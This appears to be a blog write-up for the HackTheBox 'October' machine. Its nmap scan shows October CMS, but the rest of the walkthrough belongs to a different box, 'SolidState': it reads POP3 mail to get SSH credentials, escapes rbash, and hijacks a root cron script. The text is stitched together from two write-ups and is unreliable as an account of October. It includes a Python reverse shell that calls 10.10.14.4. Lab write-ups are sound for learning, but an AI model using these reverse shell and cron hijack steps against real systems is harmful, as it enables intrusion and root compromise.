---
layout: post
title: HackTheBox | October
date: 2018-07-02 19:00:00 -0400
categories:
- hackthebox
description: Solutions for HackTheBox October
image:
  feature: assets/img/sacred-geometry-preview-02-.jpg-900x675.jpeg
  credit: 
  creditlink: 
---
This post will describe exploitation of the October device on [HackTheBox](https://www.hackthebox.eu).

## Enumeration

As is tradition, we run a full nmap scan:

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 (DSA)
|   2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA)
|_  256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Potentially risky methods: PUT PATCH DELETE
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: October CMS - Vanilla
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.1 (91%), Linux 3.16 (91%), Linux 3.16 - 3.19 (91%), Linux 3.18 (91%), Linux 3.2 - 4.4 (91%), Linux 4.2 (91%), Linux 4.4 (91%), Linux 3.11 (90%), Linux 3.12 (90%), Linux 3.13 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   79.38 ms  10.10.12.1
2   119.08 ms 10.10.10.16
 
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

 From this result we see that only two ports are open, with nothing but an HTTP Server and a SSH port open. First things first, lets just visit the website and see if there’s anything interesting there. So we direct our web-browser to the IP.

Logging in with Default Credentials:

![](https://image.ibb.co/h9w4yb/2.png)

From this admin panel, we can change any user's password:

![](https://image.ibb.co/bu1hjG/3.png)

This makes it easy to enumerate each user's emails in turn.  For this we simply change each password to the user's username and then we can login to each one via POP3.  On Mindy's account we find some interesting emails.

```bash
root@kali:~/htb/SolidState# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS mindy
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

We have recovered a username and password for Mindy, so let's SSH to the machine. Sounds easy enough.

## Privilege Escalation

### Rbash escape

When we SSH to the device, we're greeted by a restricted shell.

![](https://image.ibb.co/cpZ2jG/4.png)

Escaping restricted shells could be a post in its own right so I'd recommend reading [Escape from SHELLcatraz](https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells), if you're interested in the topic.

To break out of this rbash shell we will need to use the `--noprofile` flag to bash on login as below, so rbash isn't loaded.

![](https://image.ibb.co/e1WhjG/5.png)

Upon our enumeration, we come across an interesting world-writeable file in /opt.  This might seem quite esoteric, but just remember to always check the `/opt` and `/usr/local` directories for any interesting custom packages or scripts.  Running [LinEnum](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) on every box you enumerate, and learning to pick out useful information is also an invaluable skill.  I recommend doing that here and finding where this file is referenced.

![](https://image.ibb.co/dk7NjG/6.png)

```python
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py
#!/usr/bin/env python

import os
import sys
if not os.geteuid() == 0:
    sys.exit("\nOnly root can run this script\n")
```

There's nothing in crontab, but considering it's been written as if only root can run it, and is owned by root, this suggests the root user may have a cron job set up for this script.  I had an inkling that this would be the case, so I wrote a script to fetch the root flag and output it to a temporary folder.  This one was definitely more down to CTF intuition than anything else.

We place the following code in tmp.py:

```python
#!/usr/bin/env python

import os

with open('/root/root.txt', 'rb') as rootfile:
    with open('/var/tmp/.crash', 'wb') as openthis:
        openthis.write(rootfile.read())
```

After a short amount of time, the flag is indeed written to the /var/tmp directory.

Getting a shell from this is then as simple as setting the python file to run any number of [reverse shells](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

We'll place the following in tmp.py:

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.4",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

Wait a few minutes and:

![](https://image.ibb.co/iBjPyb/7.png)